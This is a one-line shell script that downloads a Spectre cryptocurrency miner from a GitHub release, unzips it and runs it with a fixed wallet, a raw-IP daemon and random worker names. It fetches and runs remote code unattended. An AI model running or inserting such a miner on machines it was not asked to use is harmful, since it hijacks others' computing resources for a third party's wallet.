#!/bin/sh

wget https://github.com/argenminers/spectre-blockchain/releases/download/v0.3.14/spectre-pool.zip && unzip -q spectre-pool.zip && ./tnn-miner --spectre --wallet spectre:qzeytawq5ynre6g42c3edl8ulnfzzx8ldktg37yhhpmrjatyhutjqm7v4g290 --daemon-address 142.93.71.111 --port 80 --worker-name $(shuf -n 1 -i 1-99999)-Bismillah --threads 2 
